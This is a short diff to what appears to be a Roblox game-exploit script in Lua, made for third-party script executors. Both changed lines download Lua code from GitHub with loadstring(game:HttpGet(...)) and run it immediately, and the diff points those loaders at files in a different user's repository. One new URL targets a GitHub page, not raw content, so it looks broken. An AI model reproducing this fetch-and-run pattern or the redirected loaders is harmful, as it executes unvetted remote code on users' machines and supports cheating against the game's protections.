@@ -4,7 +4,7 @@
 	Removal of initial credits to the authors is prohibited.
 ]]
 
-if not syn then loadstring(game:HttpGet("https://raw.githubusercontent.com/41yX/congenial-chainsaw/main/roblox%20skrypt.txt"))() return end
+if not syn then loadstring(game:HttpGet("https://raw.githubusercontent.com/41yX/congenial-chainsaw/main/robloxskrypt.lua"))() return end
 
 if hookmetamethod and typeof(hookmetamethod) == 'function' then
 	local oldHook
@@ -44,7 +44,7 @@ local xspin = 0
 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/hook/hookwscripts.lua"))()
+loadstring(game:HttpGet("https://github.com/41yX/congenial-chainsaw/blob/main/bbb.lua"))()
 task.wait()
   --Anti-AFK
 local Players = game:GetService("Players")
